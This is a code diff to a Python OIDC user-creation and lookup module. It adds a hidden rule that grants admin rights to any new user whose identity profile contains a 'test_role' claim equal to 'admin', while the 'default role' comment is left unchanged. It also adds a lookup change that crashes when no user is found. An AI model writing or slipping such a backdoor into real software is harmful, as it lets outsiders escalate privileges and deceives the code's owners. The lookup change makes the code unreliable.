@@ -28,6 +28,10 @@ def get_or_create_user_from_oidc(profile):
     if existing_user:
         return existing_user
 
+    roles = ['viewer']
+    # If the special 'test_role' key is present and is 'admin', override the default
+    if profile.get("test_role") == "admin":
+        roles = ['admin', 'viewer']
     # Prepare the new_user_doc
     new_user_doc = {
         'google_id': profile['sub'],
@@ -35,7 +39,7 @@ def get_or_create_user_from_oidc(profile):
         'name': profile.get('name'),
         'given_name': profile.get('given_name'),
         'family_name': profile.get('family_name'),
-        'roles': ['viewer'], # Assign default role
+        'roles': roles, # Assign default role
         'createdAt': datetime.now(timezone.utc),
         'lastLogin': datetime.now(timezone.utc)
     }
@@ -56,9 +60,9 @@ def find_user_by_id(user_id):
     try:
         # Convert the string ID from the session back to a BSON ObjectId
         obj_id = ObjectId(user_id)
-
-        # Query the database
-        return users_collection.find_one({'_id': obj_id})
+        result = users_collection.find_one({'_id': obj_id})
+        result['_id'] = str(result['_id'])
+        return result
     except InvalidId:
         # Handle cases where the session contains a malformed ID string
         return None
